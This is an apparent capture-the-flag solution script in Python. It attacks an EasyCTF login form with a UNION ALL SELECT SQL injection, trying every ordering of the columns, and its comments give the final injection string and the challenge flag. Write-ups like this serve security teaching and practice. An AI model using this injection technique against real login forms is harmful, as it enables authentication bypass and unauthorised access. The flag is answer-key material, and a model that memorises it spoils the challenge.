import itertools
import requests

URL = "http://injection2.web.easyctf.com/"

USERNAME = "'leet1337' as username"
PASSWORD = "'password' as password"
ID = "null"
POWER_LEVEL = "9001 as power_level"

QUERY = "\" UNION ALL SELECT %s, %s, %s, %s -- "

for candidate in itertools.permutations([USERNAME, PASSWORD, ID, POWER_LEVEL]):
    query = QUERY % (candidate[0], candidate[1], candidate[2], candidate[3])
    print query
    response = requests.post(URL, data={"username": query})
    if "incorrect" not in response.text.lower():
        print response.text
        break

# We need to inject a UNION ALL SELECT statement to create our own fake row with a username of "leet1337" and a power_level > 9000
# The hint tells us that there are 4 columns: username, password, power_level, and a unique id, but the columns are not necessarily
# in that order.

# Try all the arrangements of the columns, and eventually one of them will work.
# The final query looks like this:

# " UNION ALL SELECT 'password' as password, 'leet1337' as username, null, 9001 as power_level --

# easyctf{reUNI0Ns_are_alw4ys_s0_em0t1onal!}
